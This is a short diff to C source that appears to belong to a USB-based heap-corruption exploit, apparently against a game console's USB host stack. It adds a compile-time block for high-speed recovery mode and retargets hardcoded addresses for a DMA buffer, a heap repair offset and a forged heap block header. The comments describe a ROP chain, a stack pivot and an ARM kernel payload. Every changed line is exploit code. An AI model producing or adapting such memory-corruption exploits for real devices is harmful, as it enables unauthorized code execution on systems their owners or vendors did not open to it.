@@ -24,6 +24,7 @@ static const uint8_t heap_repair_data_full_speed[] = {
 };
 
 #ifndef NO_HIGH_SPEED
+#error high speed not supported for recovery mode yet
 static const uint8_t heap_repair_data[] = {
 #include "data-0x102ad880.inc"
 };
@@ -36,7 +37,7 @@ static const uint8_t heap_repair_data[] = {
 #define USB_REQ_CUSTOM 0x30
 
 // location of the pEp0DmaBuf (containing the final rop, arm kernel and event)
-#define EP0DMABUF_LOCATION 0x1029d880u
+#define EP0DMABUF_LOCATION 0x1029d4c0u
 // location of the last descriptor storing data
 #define LAST_DESC_LOCATION 0x102ab3a0u
 #define LAST_DESC_LOCATION_HS 0x102a7fe0u
@@ -44,7 +45,7 @@ static const uint8_t heap_repair_data[] = {
 #define CTRL_MGR_LOCATION 0x102b50a0u
 #define CTRL_MGR_LOCATION_HS 0x102b0860u
 // offset to the repair data we need to copy
-#define HEAP_REPAIR_OFFSET 0x24e0
+#define HEAP_REPAIR_OFFSET 0x2120
 #define HEAP_REPAIR_OFFSET_HS 0x58a0
 
 // final rop after the stackpivot
@@ -467,7 +468,7 @@ int device_setup(udpih_device_t *device, const struct usb_ctrlrequest *ctrlreque
 
                         // this is where the next pointer will point to
                         // add a large heap header here
-                        HeapBlockHeader* hdr = (HeapBlockHeader*) (buf + 0x5380);
+                        HeapBlockHeader* hdr = (HeapBlockHeader*) (buf + 0x5740);
                         hdr->magic = cpu_to_be32(0xBABE0000u);
                         hdr->size = cpu_to_be32(0x100000u);
                         // make sure the previous block gets updated
